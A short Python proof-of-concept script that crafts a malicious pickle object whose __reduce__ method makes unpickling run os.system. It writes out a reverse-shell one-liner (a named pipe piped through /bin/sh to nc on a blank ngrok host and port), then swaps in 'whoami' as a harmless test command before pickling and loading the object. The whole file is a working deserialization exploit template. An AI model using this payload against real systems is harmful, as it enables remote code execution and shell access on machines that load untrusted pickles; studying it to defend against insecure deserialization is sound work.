import os
import pickle

NGROK_HOST = ""  # TODO: ngrok host
NGROK_PORT = 0  # TODO: ngrok port


class RCE:
    def __reduce__(self):
        cmd = "rm -rf /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc %s %d > /tmp/f" % (
            NGROK_HOST,
            NGROK_PORT,
        )
        cmd = "whoami"

        return os.system, (cmd,)


if __name__ == "__main__":
    pickled = pickle.dumps(RCE())
    print("Pickled:")
    print(pickled)

    print("Unpickled:")
    print(pickle.loads(pickled))
